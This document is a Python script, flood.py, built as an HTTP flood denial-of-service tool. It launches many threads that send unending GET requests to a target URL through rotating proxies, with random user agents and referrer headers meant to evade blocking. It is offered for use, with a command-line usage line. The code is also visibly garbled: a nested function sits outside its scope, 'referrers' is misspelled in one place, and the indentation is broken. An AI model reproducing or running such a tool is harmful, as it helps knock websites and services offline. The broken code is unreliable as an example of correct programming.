import requests
import random
import threading
import time
import sys

def flood(url, duration, num_threads, proxies_file, ua_file):
    # Load UA and proxy lists from files
    ua_list = open(ua_file).read().splitlines()
    proxy_list = open(proxies_file).read().splitlines()

    # Generate random headers
def get_random_headers():
    referrers = ['https://www.google.com', 'https://www.facebook.com', 'https://www.twitter.com', 'https://www.linkedin.com', 'https://www.reddit.com', 'https://www.youtube.com', 'https://www.instagram.com', 'https://www.pinterest.com', 'https://www.tumblr.com', 'https://www.snapchat.com', 'https://www.quora.com', 'https://www.amazon.com', 'https://www.wikipedia.org', 'https://www.netflix.com', 'https://www.apple.com', 'https://www.microsoft.com', 'https://www.github.com', 'https://www.stackoverflow.com', 'https://www.twitch.tv', 'https://www.discord.gg']
headers = {
    'User-Agent': random.choice(ua_list),
        'Referer': random.choice(referers)
    }
    return headers

    # Perform the flood attack
    def send_request(url):
        while True:
            proxy = random.choice(proxy_list)
            try:
                requests.get(url, headers=get_random_headers(), proxies={'http': proxy})
            except requests.exceptions.RequestException:
                pass

    # Start the flood attack threads
    print(f'Starting {num_threads} thread(s)...')
    start_time = time.time()
    for _ in range(num_threads):
        t = threading.Thread(target=send_request, args=(url,))
        t.start()

    # Wait for the specified duration
    time.sleep(duration)

    # Stop the flood attack
    print('Stopping threads...')
    sys.exit()

# Get command line arguments
if len(sys.argv) != 6:
    print('Usage: python flood.py <url> <time> <thread> <proxies> <ua>')
    sys.exit()

url = sys.argv[1]
duration = int(sys.argv[2])
num_threads = int(sys.argv[3])
proxies_file = sys.argv[4]
ua_file = sys.argv[5]

# Run the flood attack
flood(url, duration, num_threads, proxies_file, ua_file)
